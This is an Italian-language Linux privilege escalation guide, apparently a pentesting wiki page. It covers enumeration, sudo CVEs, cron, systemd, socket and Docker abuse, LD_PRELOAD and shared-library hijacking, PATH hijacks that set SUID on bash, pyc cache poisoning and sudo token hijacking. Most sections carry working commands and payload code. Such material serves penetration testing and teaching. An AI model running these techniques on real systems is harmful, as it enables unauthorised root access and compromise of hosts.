...
Per un contesto più ampio e per i workflow storici di enumeration, confronta le risorse g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i elencate nei riferimenti.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informazioni sul sistema

### Informazioni sul sistema operativo

Iniziamo raccogliendo alcune informazioni sul sistema operativo in esecuzione
```bash
...
Se **hai permessi di scrittura su una qualsiasi cartella contenuta nella variabile `PATH`**, potresti riuscire a effettuare l'hijacking di alcune librerie o binari:
```bash
echo $PATH
```
### Informazioni sull'ambiente

Informazioni interessanti, password o API key nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Controlla la versione del kernel e verifica se esiste qualche exploit che possa essere utilizzato per aumentare i privilegi
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare un buon elenco di kernel vulnerabili e alcuni **compiled exploits** già qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
...
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguirlo sulla vittima; controlla solo gli exploit per il kernel 2.x)
...
Escalation dei privilegi Linux - Kernel Linux <= 3.19.0-73.8
```bash
...
In base alle versioni vulnerabili di sudo presenti in:
```bash
searchsploit sudo
```
...
Le versioni di Sudo precedenti alla 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) consentono agli utenti locali non privilegiati di effettuare privilege escalation ottenendo i privilegi di root tramite l'opzione `--chroot` di sudo, quando il file `/etc/nsswitch.conf` viene utilizzato da una directory controllata dall'utente.<sup>[[28]](#references)[[29]](#references)</sup>
...
Per ulteriori informazioni, consulta l'[avviso originale sulla vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo precedente alla 1.9.17p1 (intervallo interessato segnalato: **1.8.8–1.9.17**) può valutare le regole sudoers basate sull'host utilizzando il **nome host fornito dall'utente** tramite `sudo -h <host>` invece del **nome host reale**. Se sudoers concede privilegi più ampi su un altro host, puoi effettuare lo **spoofing** di tale host localmente.<sup>[[29]](#references)</sup>

Requisiti:
- Versione di sudo vulnerabile
- Regole sudoers specifiche per l'host (l'host non è né il nome host corrente né `ALL`)
...
sudo -h devbox -i
```
Se la risoluzione del nome contraffatto si blocca, aggiungilo a `/etc/hosts` oppure usa un hostname che compare già nei log/configs per evitare le query DNS.
...
Se ti trovi all'interno di un container, inizia con la seguente sezione container-security e poi passa alle pagine relative agli abusi specifici del runtime:
...
Enumera i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Inoltre, verifica se è installato **un qualsiasi compilatore**. Questo è utile se devi utilizzare qualche kernel exploit, poiché è consigliabile compilarlo sulla macchina in cui intendi utilizzarlo (o su una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerabile installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una vecchia versione di Nagios, ad esempio, che potrebbe essere sfruttata per l'escalation dei privilegi…\
...
> [!NOTE] > _Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili; pertanto, sono consigliate applicazioni come OpenVAS o simili, che verifichino se la versione di un software installato è vulnerabile a exploit noti_

## Processi

Dai un'occhiata a **quali processi** sono in esecuzione e verifica se qualche processo dispone di **più privilegi di quanti dovrebbe** (magari un tomcat eseguito da root?).
```bash
ps aux
ps -ef
top -n 1
```
Controlla sempre la presenza di possibili [**debugger electron/cef/chromium** in esecuzione: potresti sfruttarli per aumentare i privilegi](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando il parametro `--inspect` nella riga di comando del processo.\
Controlla anche i tuoi **privilegi sui binari dei processi**: forse puoi sovrascriverne qualcuno.

### Catene padre-figlio tra utenti diversi

Un processo figlio eseguito con un **utente diverso** da quello del processo padre non è automaticamente malevolo, ma rappresenta un utile **segnale per il triage**. Alcune transizioni sono previste (`root` che avvia un service user, i gestori degli accessi che creano processi di sessione), ma catene insolite possono rivelare wrapper, helper di debug, persistence o confini di trust del runtime deboli.
...
```
Se `/proc/<PID>/exe` punta a `(deleted)`, il processo sta ancora eseguendo dalla memoria la vecchia immagine binaria. È un forte segnale da analizzare perché:

- l'eseguibile rimosso può contenere stringhe o credenziali interessanti
- il processo in esecuzione può ancora esporre file descriptors utili
- un binary privilegiato eliminato può indicare una recente manomissione o un tentativo di cleanup
...
cat /proc/<PID>/fd/<FD>
```
Questo è particolarmente utile quando un processo mantiene aperto un secret, uno script, un database export o un flag file eliminato.
...
Normalmente sono necessari **privilegi root** per leggere la memoria dei processi appartenenti ad altri utenti; pertanto, questa tecnica è solitamente più utile quando sei già root e vuoi scoprire altre credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Nota che oggi la maggior parte delle macchine **non consente ptrace per impostazione predefinita**, il che significa che non puoi effettuare il dump di altri processi appartenenti al tuo utente non privilegiato.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tutti i processi possono essere sottoposti a debug, purché abbiano lo stesso uid. Questo è il modo classico in cui funzionava ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo un processo parent può essere sottoposto a debug.
> - **kernel.yama.ptrace_scope = 2**: solo l'admin può usare ptrace, poiché è necessaria la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario un reboot per abilitare nuovamente ptracing.
...
Per un determinato ID di processo, **maps mostra come la memoria è mappata all'interno dello spazio degli indirizzi** virtuali di quel processo; mostra anche i **permessi di ogni regione mappata**. Il file pseudo **mem espone la memoria stessa del processo**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i relativi offset. Usiamo queste informazioni per **posizionarci nel file mem e scaricare tutte le regioni leggibili** in un file.
```bash
procdump()
(
...
```
Puoi fare il dump del processo (consulta le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare le credenziali nella memoria:
```bash
./dump-memory.sh 2027
...
### Crontab UI (alseambusher) in esecuzione come root – privesc tramite scheduler web

Se un pannello web “Crontab UI” (alseambusher/crontab-ui) viene eseguito come root ed è associato solo all'interfaccia loopback, puoi comunque raggiungerlo tramite port forwarding locale SSH e creare un job privilegiato per effettuare la privilege escalation.<sup>[[1]](#references)[[4]](#references)</sup>

Catena tipica
- Individua la porta accessibile solo tramite loopback (ad es. 127.0.0.1:8000) e il realm Basic-Auth tramite `ss -ntlp` / `curl -v localhost:8000`
...
- Associa il servizio a localhost e limita inoltre l’accesso tramite firewall/VPN; non riutilizzare le password
- Evita di includere i secret nei file delle unità; utilizza secret store o un EnvironmentFile accessibile solo a root
- Abilita l’auditing e il logging per le esecuzioni dei job on-demand

Verifica se qualche job schedulato è vulnerabile. Forse puoi sfruttare uno script eseguito da root (vulnerabilità wildcard? Puoi modificare file utilizzati da root? Usare symlink? Creare file specifici nella directory utilizzata da root?).
```bash
crontab -l
...
Se all'interno di questo crontab l'utente root tenta di eseguire un comando o uno script senza impostare il percorso. Ad esempio: _\* \* \* \* root overwrite.sh_\
Puoi ottenere una shell di root usando:
```bash
...
Leggi la pagina seguente per scoprire altri trucchi di exploitation dei wildcard:
...
### Injection di Bash arithmetic expansion nei parser dei log di cron

Bash esegue la parameter expansion e la command substitution prima della valutazione aritmetica in ((...)), $((...)) e let. Se un cron/parser eseguito da root legge campi di log non attendibili e li inserisce in un contesto aritmetico, un attacker può iniettare una command substitution $(...) che verrà eseguita come root quando viene eseguito il cron.<sup>[[22]](#references)</sup>

- Perché funziona: in Bash, le expansion avvengono in quest'ordine: parameter/variable expansion, command substitution, arithmetic expansion, quindi word splitting e pathname expansion. Pertanto, un valore come `$(/bin/bash -c 'id > /tmp/pwn')0` viene prima sostituito (eseguendo il comando), poi il `0` numerico rimanente viene usato per l'arithmetic, così lo script continua senza errori.
...
- Exploitation: fai scrivere del testo controllato dall'attacker nel log analizzato, in modo che il campo dall'aspetto numerico contenga una command substitution e termini con una cifra. Assicurati che il tuo comando non stampi su stdout (oppure reindirizza l'output), così l'arithmetic rimane valido.
```bash
...
### Sovrascrittura dello script di cron e symlink
...
Quando esamini script/binari privilegiati che leggono o scrivono file tramite un percorso, verifica come vengono gestiti i link:
...
- `O_EXCL` con `O_CREAT`: fallisce se il percorso esiste già (blocca link/file creati in precedenza dall'attaccante).
- `openat()`: opera in relazione a un file descriptor di una directory attendibile.
- `mkstemp()`: crea file temporanei atomically con permessi sicuri.

### Binary cron firmati custom con payload scrivibili

I team di difesa a volte "firmano" i binary gestiti da cron estraendo una sezione ELF custom e cercando con grep una stringa del vendor prima di eseguirli come root. Se quel binary è scrivibile dal gruppo (ad esempio `/opt/AV/periodic-checks/monitor`, di proprietà di `root:devs 770`) e riesci a fare leak del materiale di firma, puoi falsificare la sezione e dirottare il task cron:<sup>[[2]](#references)</sup>
...
2. Ricrea il certificato previsto usando la chiave/configurazione ottenuta dal leak (da `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Crea una sostituzione malevola (ad esempio, inserisci una bash SUID o aggiungi la tua SSH key) e incorpora il certificato in `.text_sig` in modo che grep abbia esito positivo:
```bash
...
```
4. Sovrascrivi il binary pianificato preservando i bit di esecuzione:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendi la successiva esecuzione di cron; quando il controllo della firma, troppo semplice, avrà esito positivo, il tuo payload verrà eseguito come root.

### Processi cron frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Potresti riuscire a sfruttarli per effettuare una privilege escalation.

Ad esempio, per **monitorare ogni 0,1 s per 1 minuto**, **ordinare in base ai comandi eseguiti meno volte** ed eliminare i comandi che sono stati eseguiti più frequentemente, puoi usare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (monitora ed elenca ogni processo che viene avviato).

### Backup root che preservano i mode bits impostati dall'attaccante (pg_basebackup)

Se un cron di proprietà di root esegue `pg_basebackup` (o qualsiasi copia ricorsiva) su una directory del database in cui puoi scrivere, puoi inserire un **binario SUID/SGID** che verrà ricopiato come **root:root**, mantenendo gli stessi mode bits nell'output del backup.<sup>[[26]](#references)</sup>
...
```
Questo funziona perché `pg_basebackup` preserva i bit dei permessi dei file durante la copia del cluster; quando viene eseguito da root, i file di destinazione ereditano **la proprietà di root + SUID/SGID scelti dall'attaccante**. Qualsiasi routine privilegiata di backup/copia simile che conservi i permessi e scriva in una posizione eseguibile è vulnerabile.
...
Verifica se puoi scrivere in un file `.service`; in tal caso, **potresti modificarlo** in modo che **esegua** la tua **backdoor quando** il servizio viene **avviato**, **riavviato** o **arrestato** (potresti dover attendere il riavvio della macchina).\
Ad esempio, crea la tua backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Binaries dei servizi scrivibili

Tieni presente che, se disponi di **permessi di scrittura sui binaries eseguiti dai servizi**, puoi modificarli per inserire delle backdoor, che verranno eseguite quando i servizi saranno rieseguiti.
...
```
Quindi, crea un **eseguibile** con lo **stesso nome del binario del percorso relativo** all'interno della cartella del PATH di systemd in cui puoi scrivere e, quando al servizio viene richiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), verrà eseguito il tuo **backdoor** (gli utenti non privilegiati di solito non possono avviare/arrestare i servizi, ma verifica se puoi usare `sudo -l`).

**Scopri di più sui servizi con `man systemd.service`.**

## **Timers**

I **Timers** sono file unit di systemd il cui nome termina con **.timer** e che controllano file **.service** o eventi. I **Timers** possono essere utilizzati come alternativa a cron, poiché supportano nativamente gli eventi temporali basati sul calendario e gli eventi temporali monotoni e possono essere eseguiti in modo asincrono.
...
Se puoi modificare un timer, puoi fare in modo che esegua alcuni elementi di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione puoi leggere cos'è l'Unit:

> L'unità da attivare quando scade questo timer. L'argomento è il nome di un'unità, il cui suffisso non è ".timer". Se non specificato, questo valore assume per impostazione predefinita il nome di un service che ha lo stesso nome dell'unità timer, ad eccezione del suffisso. (Vedi sopra.) È consigliato che il nome dell'unità attivata e il nome dell'unità timer siano identici, ad eccezione del suffisso.

Pertanto, per abusare di questo permesso dovresti:

- Trovare un'unità systemd (come un `.service`) che **esegue un binary scrivibile**
- Trovare un'unità systemd che **esegue un percorso relativo** e su cui hai **privilegi di scrittura** del **PATH di systemd** (per impersonare quell'eseguibile)
...
I Unix Domain Sockets (UDS) consentono la **comunicazione tra processi** sulla stessa macchina o su macchine diverse all'interno dei modelli client-server. Utilizzano file descriptor Unix standard per la comunicazione tra computer e vengono configurati tramite file `.socket`.<sup>[[14]](#references)</sup>
...
- `Accept`: Accetta un argomento booleano. Se **true**, viene **avviata un'istanza del service per ogni connessione in entrata** e le viene passato solo il socket della connessione. Se **false**, tutti i socket in ascolto vengono **passati direttamente alla service unit avviata** e viene avviata una sola service unit per tutte le connessioni. Questo valore viene ignorato per i socket datagram e le FIFO, dove una singola service unit gestisce incondizionatamente tutto il traffico in entrata. **Il valore predefinito è false**. Per motivi di prestazioni, è consigliabile scrivere i nuovi daemon esclusivamente in modo compatibile con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Accettano una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **socket**/le FIFO in ascolto siano stati **creati** e associati, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito dagli argomenti del processo.
- `ExecStopPre`, `ExecStopPost`: **Comandi** aggiuntivi che vengono **eseguiti prima** o **dopo** che i **socket**/le FIFO in ascolto vengano **chiusi** e rimossi, rispettivamente.
...
Se trovi un file `.socket` **scrivibile**, puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa come: `ExecStartPre=/home/kali/sys/backdoor`; la backdoor verrà eseguita prima che il socket venga creato. Pertanto, **probabilmente dovrai attendere il riavvio della macchina.**\
_Tieni presente che il sistema deve utilizzare la configurazione di quel file socket, altrimenti la backdoor non verrà eseguita_
...
In questo caso, l'attacker può creare `<name>.service`, quindi inviare traffico al socket affinché systemd carichi ed esegua il nuovo service come root.
...
Nota che potrebbero esserci alcuni **socket in ascolto per richieste HTTP** (_non mi riferisco ai file .socket, ma ai file che fungono da socket Unix_). Puoi verificarlo con:
```bash
...
Il socket Docker, spesso presente in `/var/run/docker.sock`, è un file critico che deve essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Disporre dell'accesso in scrittura a questo socket può portare a una privilege escalation. Ecco una spiegazione di come eseguire questa operazione e dei metodi alternativi nel caso in cui la Docker CLI non sia disponibile.

#### **Privilege Escalation with Docker CLI**

Se disponi dell'accesso in scrittura al socket Docker, puoi eseguire una privilege escalation usando i seguenti comandi:<sup>[[15]](#references)</sup>
```bash
...
Nei casi in cui la Docker CLI non sia disponibile, il socket Docker può comunque essere abusato utilizzando HTTP grezzo sul socket Unix. Il flusso più affidabile è:
...
```
Questo pattern è solitamente più robusto rispetto a cercare di gestire manualmente `attach` con `socat` o `nc -U`. Una volta che puoi creare un helper con `/:/host`, puoi usare ulteriori istanze di `exec` per leggere file come `/host/root/...`, aggiungere chiavi SSH in `/host/root/.ssh` o modificare i file di startup dell'host.

### Altri

Nota che, se disponi dei permessi di scrittura sul docker socket perché sei **all'interno del gruppo `docker`**, hai [**altri modi per effettuare una privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se l'[**API di docker è in ascolto su una porta** puoi anche riuscire a comprometterla](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Controlla **altri modi per evadere dai container o abusare dei container runtime per effettuare una privilege escalation** in:
...
Se scopri di poter usare il comando **`ctr`**, leggi la pagina seguente, poiché **potresti riuscire ad abusarne per effettuare una privilege escalation**:
...
Se scopri di poter usare il comando **`runc`**, leggi la pagina seguente, poiché **potresti riuscire ad abusarne per effettuare una privilege escalation**:
...
D-Bus è un sofisticato **sistema di Inter-Process Communication (IPC)** che consente alle applicazioni di interagire e condividere dati in modo efficiente. Progettato pensando ai moderni sistemi Linux, offre un framework robusto per diverse forme di comunicazione tra applicazioni.<sup>[[16]](#references)</sup>

Il sistema è versatile e supporta l'IPC di base, migliorando lo scambio di dati tra processi, in modo simile agli **UNIX domain sockets avanzati**. Inoltre, consente di trasmettere eventi o segnali, favorendo una perfetta integrazione tra i componenti del sistema. Ad esempio, un segnale proveniente da un demone Bluetooth relativo a una chiamata in arrivo può chiedere a un music player di disattivare l'audio, migliorando l'esperienza dell'utente. D-Bus supporta inoltre un sistema di oggetti remoti, semplificando le richieste di servizi e le invocazioni di metodi tra applicazioni e rendendo più efficienti processi che tradizionalmente erano complessi.

D-Bus opera secondo un **modello allow/deny**, gestendo i permessi dei messaggi (chiamate di metodi, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di policy corrispondenti. Queste policy specificano le interazioni con il bus e possono consentire una privilege escalation attraverso lo sfruttamento di tali permessi.
...
```
**Scopri come enumerare ed eseguire exploit su una comunicazione D-Bus qui:**
...
lsof -i
```
### Quick triage del filtering outbound

Se l'host può eseguire comandi ma i callback falliscono, separa rapidamente il filtering DNS, del transport, del proxy e delle route:
```bash
...
```
Classifica i listener in base alla destinazione di bind:
...
### Workflow di triage per i servizi solo locali
...
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS come network scanner (modalità solo network)

Oltre ai controlli di PE locali, linPEAS può funzionare come network scanner mirato. Utilizza i binari disponibili in `$PATH` (tipicamente `fping`, `ping`, `nc`, `ncat`) e non installa tool.
```bash
...
Controlla se puoi sniffare il traffico. Se puoi, potresti riuscire a ottenere alcune credenziali.
```
timeout 1 tcpdump
```
...
ip -br addr
```
Loopback (`lo`) è particolarmente prezioso nella post-exploitation perché molti servizi accessibili solo internamente espongono token/cookie/credenziali lì:
```bash
...
Controlla se nella clipboard è presente qualcosa di interessante (se possibile)
```bash
...
Se **conosci una password qualsiasi** dell'ambiente, **prova ad accedere come ogni utente** utilizzando la password.
...
## Abusi di un PATH scrivibile

### $PATH

Se scopri di poter **scrivere all'interno di una cartella del $PATH**, potresti essere in grado di effettuare una privilege escalation **creando una backdoor all'interno della cartella scrivibile** con il nome di un comando che verrà eseguito da un altro utente (idealmente root) e che **non viene caricato da una cartella situata prima** della cartella scrivibile nel $PATH.
...
```
Alcuni **comandi inattesi consentono di leggere e/o scrivere file o persino di eseguire un comando**.<sup>[[8]](#references)</sup> Ad esempio:
```bash
...
Se uno **script Python consentito da sudo** importa un modulo il cui package directory contiene un `__pycache__` **scrivibile**, potresti essere in grado di sostituire il `.pyc` memorizzato nella cache e ottenere code execution come utente privilegiato al successivo import.<sup>[[30]](#references)</sup>

- Perché funziona:
- CPython memorizza le cache del bytecode in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- L'interprete convalida l'**header** (magic + metadati di timestamp/hash associati al source), quindi esegue il code object marshaled memorizzato dopo tale header.
...
- Percorso tipico:
- `sudo -l` mostra uno script Python o un wrapper che puoi eseguire come root.
...
```
Se puoi ispezionare lo script con privilegi, identifica i moduli importati e il relativo percorso della cache:<sup>[[32]](#references)</sup>
```bash
...
3. Compila un code object contenente un payload, esegui `marshal.dumps(...)`, elimina il file di cache originale e ricrealo con l'header originale seguito dal tuo bytecode malevolo.
...
- L'attacco fallisce se il processo privilegiato usa `PYTHONDONTWRITEBYTECODE=1`, importa da una posizione con permessi sicuri o rimuove l'accesso in scrittura da ogni directory nel percorso di importazione.
...
- Per le esecuzioni con privilegi, considera `PYTHONDONTWRITEBYTECODE=1` e controlli periodici per individuare directory `__pycache__` scrivibili inattese.
- Tratta i moduli Python locali scrivibili e le directory di cache scrivibili allo stesso modo degli shell script o delle shared libraries scrivibili eseguiti da root.

### BASH_ENV preservata tramite sudo env_keep → shell di root

Se sudoers preserva `BASH_ENV` (ad esempio, `Defaults env_keep+="ENV BASH_ENV"`), puoi sfruttare il comportamento di avvio non-interactive di Bash per eseguire codice arbitrario come root quando invochi un comando consentito.<sup>[[24]](#references)</sup>

- Perché funziona: per le shell non-interactive, Bash valuta `$BASH_ENV` e fa il source di quel file prima di eseguire lo script target. Molte regole sudo consentono di eseguire uno script o uno shell wrapper. Se `BASH_ENV` viene preservata da sudo, il tuo file viene sottoposto a source con privilegi di root.<sup>[[23]](#references)</sup>

- Requisiti:
- Una regola sudo che puoi eseguire (qualsiasi target che invochi `/bin/bash` in modo non-interactive o qualsiasi bash script).
...
- Evitare shell wrapper per i comandi consentiti da sudo; usare binari minimali.
...
- Indicare il provider richiesto a una directory scrivibile e inserire un plugin malevolo con il nome del provider (ad esempio `terraform-provider-examples`):
```hcl
# ~/.terraformrc
...
```
Terraform fallirà durante il plugin handshake di Go, ma eseguirà il payload come root prima di terminare, lasciando una shell SUID.

### Bypass della validazione di TF_VAR overrides + symlink

Le variabili Terraform possono essere fornite tramite variabili d'ambiente `TF_VAR_<name>`, che persistono quando sudo preserva l'ambiente. Validazioni deboli come `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` possono essere bypassate con symlink:<sup>[[25]](#references)</sup>
```bash
...
Su alcune distribuzioni meno recenti, sudo può essere configurato con `requiretty`, che obbliga sudo a essere eseguito solo da un TTY interattivo. Se è impostato `!requiretty` (oppure l’opzione è assente), sudo può essere eseguito da contesti non interattivi come reverse shell, cron job o script.
```bash
Defaults !requiretty
```
Questo non è di per sé una vulnerabilità diretta, ma amplia le situazioni in cui le regole di sudo possono essere abusate senza richiedere una PTY completa.

### Sudo env_keep+=PATH / secure_path non sicuro → PATH hijack

Se `sudo -l` mostra `env_keep+=PATH` o un `secure_path` contenente voci scrivibili dall'attaccante (ad es. `/home/<user>/bin`), qualsiasi comando relativo all'interno del target consentito da sudo può essere sovrascritto.<sup>[[3]](#references)</sup>

- Requisiti: una regola sudo (spesso `NOPASSWD`) che esegue uno script/binario il quale richiama comandi senza percorsi assoluti (`free`, `df`, `ps`, ecc.) e una voce PATH scrivibile che viene cercata per prima.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
...
**Passa** a leggere altri file o usa **symlinks**. Ad esempio nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
...
### Comando sudo/file binario SUID senza percorso del comando
...
[Examples of Payload da eseguire.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)
...
```
Quindi, quando richiami il binario suid, questa funzione verrà eseguita

### Script scrivibile eseguito da un wrapper SUID

Una configurazione errata comune delle custom app è un wrapper binario SUID di proprietà di root che esegue uno script, mentre lo script stesso è scrivibile dagli utenti con bassi privilegi.
...
La variabile d'ambiente **LD_PRELOAD** viene utilizzata per specificare una o più shared libraries (file .so) da caricare tramite il loader prima di tutte le altre, inclusa la standard C library (`libc.so`). Questo processo è noto come preloading di una library.
...
- Per gli eseguibili con suid/sgid, vengono preloaded solo le library presenti nei percorsi standard che sono anch'esse suid/sgid.

La privilege escalation può verificarsi se hai la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'istruzione **env_keep+=LD_PRELOAD**. Questa configurazione consente alla variabile d'ambiente **LD_PRELOAD** di persistere e di essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, consentendo potenzialmente l'esecuzione di arbitrary code con privilegi elevati.<sup>[[9]](#references)</sup>
```
...
```
Infine, **eleva i privilegi** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc simile può essere sfruttato se l'attaccante controlla la variabile d'ambiente **LD_LIBRARY_PATH**, poiché controlla il percorso in cui verranno cercate le librerie.
```c
#include <stdio.h>
#include <stdlib.h>
...
Quando ci si imbatte in un binary con permessi **SUID** che sembra insolito, è buona pratica verificare se sta caricando correttamente i file **.so**. È possibile verificarlo eseguendo il seguente comando:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, riscontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggerisce una potenziale possibilità di exploit.
...
Compila il file C sopra riportato in un file shared object (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del binary SUID interessato dovrebbe attivare l'exploit, consentendo una potenziale compromissione del sistema.
...
```
questo significa che la libreria generata deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che possono essere sfruttati da un attaccante per aggirare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso progetto, ma per i casi in cui è possibile **iniettare solo argomenti** in un comando.

Il progetto raccoglie funzioni legittime dei binari Unix che possono essere abusate per evadere da restricted shell, fare privilege escalation o mantenere privilegi elevati, trasferire file, avviare bind e reverse shell e facilitare altre attività di post-exploitation.
...
Nei casi in cui disponi di **accesso sudo** ma non della password, puoi fare privilege escalation **attendendo l'esecuzione di un comando sudo e quindi hijackando il session token**.<sup>[[18]](#references)</sup>
...
sudo su
```
- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root e con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
...
Se disponi dei **permessi di scrittura** sulla cartella o su uno qualsiasi dei file creati al suo interno, puoi usare il binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e un PID**.\
...
Esistono alcune alternative al binario `sudo`, come `doas` per OpenBSD; ricordati di controllare la configurazione in `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Se `doas` consente un editor o un interprete, verifica gli escape in stile GTFOBins:
```bash
doas vim
:!/bin/sh
```
...
Se per qualche motivo **un utente dispone dei permessi di scrittura** su uno dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella indicata nel file di configurazione presente in `/etc/ld.so.conf.d/*.conf`, potrebbe essere in grado di eseguire un'escalation dei privilegi.\
Consulta **come sfruttare questa configurazione errata** nella pagina seguente:
...
In una directory, il **bit di "esecuzione"** implica che l'utente interessato possa eseguire **cd** nella cartella.\
Il bit di **"lettura"** implica che l'utente possa **elencare** i **file**, mentre il bit di **"scrittura"** implica che l'utente possa **eliminare** e **creare** nuovi **file**.
...
sudo -l
```
Questo è un percorso di persistenza/privesc tramite ACL ad alto impatto, perché è facile non rilevarlo nelle verifiche basate solo su `ls -l`.

## Sessioni shell aperte

Nelle **versioni precedenti** potresti **hijackare** una sessione **shell** di un altro utente (**root**).\
...
```
Consulta la **Valentine box from HTB** per un esempio.
...
Questo bug è causato dalla creazione di una nuova chiave SSH su quei sistemi operativi, poiché erano possibili **solo 32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e che **avendo la chiave pubblica SSH è possibile cercare la chiave privata corrispondente**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
...
- **PermitEmptyPasswords**: quando l'autenticazione tramite password è consentita, specifica se il server permette l'accesso agli account con stringhe password vuote. Il valore predefinito è `no`.

### File di controllo dell'accesso

Questi file influenzano chi può effettuare il login e in che modo:

- **`/etc/nologin`**: se presente, blocca i login degli utenti non root e ne visualizza il messaggio.
- **`/etc/securetty`**: limita i terminali da cui root può effettuare il login (allowlist dei TTY).
- **`/etc/motd`**: banner mostrato dopo il login (può fare leak di dettagli sull'ambiente o sulla manutenzione).
...
Specifica i file che contengono le chiavi pubbliche utilizzabili per l'autenticazione dell'utente. Può contenere token come `%h`, che verranno sostituiti dalla home directory. **È possibile indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi alla home dell'utente**. Ad esempio:
```bash
...
SSH agent forwarding consente di **usare le tue chiavi SSH locali invece di lasciare chiavi** (senza passphrase!) sul tuo server. In questo modo, potrai fare **jump** via ssh **verso un host** e da lì fare **jump verso un altro** host **usando** la **chiave** presente nel tuo **host** iniziale.
...
Il file `/etc/sshd_config` può **consentire** o **negare** il forwarding di ssh-agent con la keyword `AllowAgentForwarding` (il valore predefinito è consentito).

Se trovi che Forward Agent è configurato in un ambiente, leggi la pagina seguente, poiché **potresti essere in grado di sfruttarlo per effettuare un'escalation dei privilegi**:
...
